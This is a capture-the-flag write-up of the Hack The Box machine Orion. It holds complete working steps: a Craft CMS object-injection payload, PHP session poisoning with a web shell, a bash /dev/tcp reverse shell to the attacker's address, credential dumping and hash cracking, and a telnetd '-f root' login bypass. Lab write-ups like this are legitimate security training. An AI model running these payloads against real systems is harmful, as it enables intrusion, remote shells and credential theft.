Hack The Box — Orion
**Machine:** Orion
**OS:** Ubuntu 22.04.5 LTS
**Difficulty:** Easy
**IP:** `10.129.126.138`

## 1. Initial reconnaissance

First, add the hostname:

```bash
sudo nano /etc/hosts
```
Add:

```text
10.129.126.138 orion.htb
```
Scan the target:

```bash
sudo nmap -p- --min-rate 10000 10.129.126.138
```
Relevant ports:

```text
22/tcp   open   ssh
80/tcp   open   http
```
Web enumeration identified **Craft CMS**, and `/admin/login` revealed:

```text
Craft CMS 5.6.16
```
We also found:

```text
/admin
/assets
/index
/index.php
/logout
```
The exposed Yii/Craft error pages additionally revealed the installation path:

```text
/var/www/html/craft
```

---

# 2. Identify the Craft CMS vulnerability

Craft CMS `5.6.16` is vulnerable to **CVE-2025-32432**, involving an object-injection issue in Yii. The underlying Yii issue is associated with `__class` taking precedence over `class`. The Orion write-up exploits this through the asset image-transform functionality. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))
SearchSploit also identifies the vulnerability:

```bash
searchsploit "Craft CMS 5.6"
```
Result:

```text
Craft CMS 5.6.16 - RCE
multiple/webapps/52525.py
```

---

# 3. Obtain a Craft session and CSRF token

Start with:

```bash
curl -c cookies.txt -s http://orion.htb/admin/login > login.html
```
Inspect the cookies:

```bash
cat cookies.txt
```
The important cookie is:

```text
CraftSessionId
```
We then retrieve a valid CSRF token:

```bash
curl -s -b cookies.txt \
  -H 'Accept: application/json' \
  http://orion.htb/actions/users/session-info
```
This returns:

```json
{
  "isGuest": true,
  "timeout": 0,
  "csrfTokenName": "CRAFT_CSRF_TOKEN",
  "csrfTokenValue": "..."
}
```
One lesson from the exploitation process: **the CSRF token can change**, so get the token and use it immediately with the corresponding cookie jar.

---

# 4. Test the object injection

The vulnerable endpoint is:

```text
/index.php?p=admin/actions/assets/generate-transform
```
The object-injection structure uses:

```json
{
  "assetId": 11,
  "handle": {
    "width": 123,
    "height": 123,
    "as hack": {
      "class": "\\craft\\behaviors\\FieldLayoutBehavior",
      "__class": "\\yii\\rbac\\PhpManager",
      "__construct()": [
        {
          "itemFile": "/var/lib/php/sessions/sess_<SESSION_ID>"
        }
      ]
    }
  }
}
```
Our first successful responses returned HTTP 500, but the stack trace was very useful.
It showed:

```text
yii\rbac\PhpManager->__construct()
yii\rbac\PhpManager->init()
yii\rbac\PhpManager->load()
```
and then:

```text
foreach() argument must be of type array|object, int given
```
That confirmed that the `PhpManager` gadget was actually being instantiated on the target. Our captured response shows this call chain through `PhpManager` and the Craft image-transform handler.

---

# 5. Poison the PHP session

The crucial idea is to put PHP code into the predictable PHP session file.
The successful payload was:

```php
<?=exec($_GET["cmd"]);die()?>
```
We poisoned the session with:

```bash
curl -g -s -D poison.headers \
  -c cookies.txt \
  'http://orion.htb/index.php?p=admin/dashboard&a=<?=exec($_GET["cmd"]);die()?>' \
  -o /dev/null
```
The application redirected us to:

```text
Location: http://orion.htb/admin/login
```
We then verified that the session contained our payload.
The debug output showed:

```text
__returnUrl =>
http://orion.htb/index.php?p=admin/dashboard&a=<?=exec($_GET["cmd"]);die()?>
```
So the PHP payload was successfully stored in the session.
At this point we had:

```text
session ID
        ↓
/var/lib/php/sessions/sess_<session ID>
        ↓
contains PHP payload
```

---

# 6. Trigger the poisoned session

We then point `PhpManager` at that exact session file.
For example, with:

```text
CraftSessionId=5429hi7sc9ob41al564f6j7qgb
```
the gadget contains:

```text
/var/lib/php/sessions/sess_5429hi7sc9ob41al564f6j7qgb
```
We also had to make sure the CSRF token matched the current cookie jar.
The final successful trigger was:

```bash
curl -s -i \
  'http://orion.htb/index.php?p=admin/actions/assets/generate-transform&cmd=whoami' \
  -X POST \
  -b cookies.txt \
  -H 'Content-Type: application/json' \
  -H "X-CSRF-Token: $TOKEN" \
  --data-raw '{"assetId":11,"handle":{"width":123,"height":123,"as hack":{"class":"\\craft\\behaviors\\FieldLayoutBehavior","__class":"\\yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/lib/php/sessions/sess_5429hi7sc9ob41al564f6j7qgb"}]}}}'
```
The response was:

```text
HTTP/1.1 200 OK
```
and, critically:

```text
a=www-data
```
That gave us definitive proof of command execution:

```text
RCE = www-data
```

---

# 7. Obtain a reverse shell

Start a listener on Kali:

```bash
sudo nc -lvnp 443
```
Then use the same RCE with a bash reverse shell:

```bash
curl -s -o /dev/null \
  'http://orion.htb/index.php?p=admin/actions/assets/generate-transform&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.160/443%200%3E%261%27' \
  -X POST \
  -b cookies.txt \
  -H 'Content-Type: application/json' \
  -H "X-CSRF-Token: $TOKEN" \
  --data-raw '{"assetId":11,"handle":{"width":123,"height":123,"as hack":{"class":"\\craft\\behaviors\\FieldLayoutBehavior","__class":"\\yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/lib/php/sessions/sess_5429hi7sc9ob41al564f6j7qgb"}]}}}'
```
Connection:

```text
connect to [10.10.14.160] from [10.129.126.138]
```
Shell:

```text
www-data@orion:~/html/craft/web$
```
Confirm:

```bash
id
whoami
pwd
```
Result:

```text
uid=33(www-data) gid=33(www-data)
www-data
/var/www/html/craft/web
```
The published Orion walkthrough follows the same progression from the Craft exploit to a `www-data` reverse shell. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))

---

# 8. Read the Craft configuration

Move into the Craft directory:

```bash
cd /var/www/html/craft
ls -la
```
The `.env` file was readable:

```bash
cat .env
```
Relevant values:

```text
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```
This gives us local MySQL credentials.
The Orion write-up uses the exposed Craft database credentials at this exact stage. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))

---

# 9. Dump the Craft users table

The interactive MySQL client behaved poorly inside the raw `nc` shell, so the non-interactive form worked better:

```bash
mysql -u root -pSuperSecureCraft123Pass! \
  -D orion \
  -e 'SELECT id,admin,username,email,password FROM users;'
```
Result:

```text
id  admin  username  email             password
1   1      admin     adam@orion.htb    $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```
So we have Adam's bcrypt password hash.

---

# 10. Crack Adam's password

Save the hash on Kali:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > adam.hash
```
Hashcat mode `3200` is bcrypt:

```bash
hashcat -m 3200 adam.hash /usr/share/wordlists/rockyou.txt
```
Hashcat successfully recovered:

```text
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```
Therefore:

```text
adam password = darkangel
```
The published Orion solution also cracks this bcrypt hash as `darkangel`. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))

---

# 11. SSH as Adam

SSH was initially attempting port 2222 because of the local SSH configuration, so we explicitly specified port 22:

```bash
ssh -p 22 adam@10.129.126.138
```
Password:

```text
darkangel
```
Confirm:

```bash
whoami
```
Result:

```text
adam
```

---

# 12. Capture the user flag

```bash
cat /home/adam/user.txt
```
Our flag:

```text
4bb0e6c299ca4b8b58f324e54a76e244
```
At this point:

```text
www-data
   ↓
.env
   ↓
MySQL
   ↓
Adam bcrypt hash
   ↓
Hashcat
   ↓
darkangel
   ↓
SSH
   ↓
adam
   ↓
user.txt
```

---

# 13. Enumerate for root

From Adam:

```bash
sudo -l
```
Adam cannot run sudo.
The important discovery is the running `inetd` service.
Process enumeration shows:

```text
inetutils-inetd
```
running as root.
The inetd configuration contains:

```text
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```
And network enumeration shows:

```text
127.0.0.1:23
```
So telnet is running locally as root.
The published Orion walkthrough identifies **GNU Inetutils telnetd 2.7** as the root escalation vector. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))

---

# 14. Identify CVE-2026-24061

The vulnerable telnetd behavior is **CVE-2026-24061**.
The problem is that `telnetd` passes the client's `USER` environment value to `/usr/bin/login`.
A specially crafted value:

```text
-f root
```
causes `login` to interpret it as an authentication-bypass option.
The published Orion analysis describes the vulnerability as an authentication bypass in GNU Inetutils telnetd versions through 2.7. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))

---

# 15. Exploit telnetd

From Adam:

```bash
USER="-f root" telnet -a 127.0.0.1
```
The machine accepts the connection:

```text
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
```
And drops us directly into:

```text
root@orion:~#
```
Confirm:

```bash
id
```
This is the final privilege escalation.
The Orion write-up uses the same technique: set `USER="-f root"` and invoke `telnet -a localhost`, resulting in a root shell. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))

---

# 16. Capture the root flag

```bash
cat /root/root.txt
```
Our root flag:

```text
f6b0ad8b3b2eee04ff11ccd93b107bd5
```

---

# Attack chain

```text
                     ORION
                       │
                       ▼
               Nmap: 22 / 80
                       │
                       ▼
                Craft CMS 5.6.16
                       │
                       ▼
                CVE-2025-32432
                       │
                       ▼
             Yii object injection
                       │
                       ▼
               PhpManager gadget
                       │
                       ▼
             PHP session poisoning
                       │
                       ▼
                    RCE
                       │
                       ▼
                  www-data
                       │
                       ▼
              /var/www/html/craft/.env
                       │
                       ▼
              MySQL root credentials
                       │
                       ▼
                 orion.users
                       │
                       ▼
             Adam bcrypt password
                       │
                       ▼
             Hashcat → darkangel
                       │
                       ▼
                    adam
                       │
                       ▼
                  user.txt
                       │
                       ▼
             localhost telnet
                       │
                       ▼
               CVE-2026-24061
                       │
                       ▼
                     root
                       │
                       ▼
                  root.txt
```

## Flags obtained

```text
User:
4bb0e6c299ca4b8b58f324e54a76e244

Root:
f6b0ad8b3b2eee04ff11ccd93b107bd5
```

## Key lessons from this box

The biggest practical lessons from Orion were:
**Craft CMS version identification matters.** Once `5.6.16` was identified, the vulnerable component became much easier to target.
**Don't treat HTTP 500 as automatic exploit failure.** In our case, the stack trace actually demonstrated that `PhpManager` had been instantiated.
**Track cookies and CSRF tokens carefully.** Our failed attempts largely came from mixing stale CSRF tokens, sessions, and trigger requests. The successful run used the poisoned session, the matching cookie jar, and a freshly obtained CSRF token.
**Use non-interactive commands inside crude reverse shells.** MySQL worked immediately with `mysql ... -e 'SELECT ...'`, whereas the interactive client was awkward inside `nc`.
**Enumerate unusual local services.** The root path wasn't sudo or a standard SUID binary; it was localhost-only telnet served by root's inetd. That unusual configuration was the clue. ([0xdf hacks stuff](https://0xdf.gitlab.io/2026/07/14/htb-orion.html?utm_source=chatgpt.com))
